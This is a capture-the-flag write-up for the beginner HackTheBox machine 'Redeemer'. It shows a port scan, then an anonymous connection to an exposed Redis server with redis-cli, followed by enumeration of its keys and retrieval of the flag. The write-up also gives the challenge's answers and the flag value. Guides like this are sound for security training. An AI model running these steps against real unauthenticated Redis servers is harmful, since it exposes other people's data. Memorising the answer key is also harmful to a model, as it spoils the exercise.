# HackTheBox - Redeemer

**Platform:** HackTheBox 

**Difficulty:** Very Easy

**⚠️Disclaimer:** This writeup contains direct answers to task questions, step-by-step solutions, and the final flag.

## Enumeration

First, we perform a full port scan using `nmap` to identify any open TCP ports on the target machine.

```bash
nmap -p- 10.129.237.62                                                                  
```
```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-26 19:44 +0200
Nmap scan report for 10.129.237.62
Host is up (0.035s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE
6379/tcp open  redis

Nmap done: 1 IP address (1 host up) scanned in 28.70 seconds
```

**Alternative Enumeration:**
As an alternative to Nmap, a custom Python port scanner (`viper.py`) can be used to quickly identify open ports.
```bash
python viper.py -sV 10.129.237.62                                                       
```
```text
____   ____.__                                                                              
\   \ /   /|__|_____   ___________                                                          
 \   Y   / |  \____ \_/ __ \_  __ \                                                         
  \     /  |  |  |_> >  ___/|  | \/                                                         
   \___/   |__|   __/ \___  >__|                                                            
              |__|        \/       v2.0                                                     

[*] Loaded 1 target(s)
[*] Thread count set to 100

[*] Scanning 65 ports on 1 hosts...

==================================================
SCAN RESULTS
==================================================

Target: 10.129.237.62
PORT       STATE      SERVICE
-----------------------------
6379       open Redis

==================================================
Scan completed in 1.08 seconds
```

Based on our scan results, we can answer the following:

**Which TCP port is open on the machine?**
> ✅ **Answer:** `6379`

**Which service is running on the port that is open on the machine?**
> ✅ **Answer:** `redis`

---

## Exploitation

Redis is a key-value store. Before connecting, we review a few fundamentals about the database.

**What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database**
> ✅ **Answer:** `In-memory Database`

**Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments.**
> ✅ **Answer:** `redis-cli`

We need to install the Redis command-line tools on our local machine to interact with the server, and then connect to the target.

```bash
sudo apt install redis-tools
```

**Which flag is used with the Redis command-line utility to specify the hostname?**
> ✅ **Answer:** `-h`

We use the `-h` flag to specify the target IP and connect to the Redis server.

```bash
redis-cli -h 10.129.237.62
```
```text
10.129.237.62:6379> 
```

Once connected, we want to gather information about the server version and configuration.

**Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server?**
> ✅ **Answer:** `info`

We run the `info` command to retrieve server statistics.

```bash
10.129.237.62:6379> info
```
```text
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:66bd629f924ac924
redis_mode:standalone
os:Linux 5.4.0-77-generic x86_64
...
```

**What is the version of the Redis server being used on the target machine?**
> ✅ **Answer:** `5.0.7`

---

## Flag Retrieval

Now we need to look for the flag inside the database. First, we ensure we are operating in the correct database index.

**Which command is used to select the desired database in Redis?**
> ✅ **Answer:** `select`

We select database index 0 (the default database).

```bash
10.129.237.62:6379> select 0
```
```text
OK
```

Next, we list all the keys stored in this database to find the flag.

**Which command is used to obtain all the keys in a database?**
> ✅ **Answer:** `keys *`

```bash
10.129.237.62:6379> keys *
```
```text
1) "temp"
2) "flag"
3) "stor"
4) "numb"
```

**How many keys are present inside the database with index 0?**
> ✅ **Answer:** `4`

We see a key named `flag`. We use the `get` command to retrieve its value.

```bash
10.129.237.62:6379> get flag
```
```text
"03e1d2b376c37ab3f5319922053953eb"
```

**Submit the flag located in the database.**
> ✅ **Answer:** `03e1d2b376c37ab3f5319922053953eb`
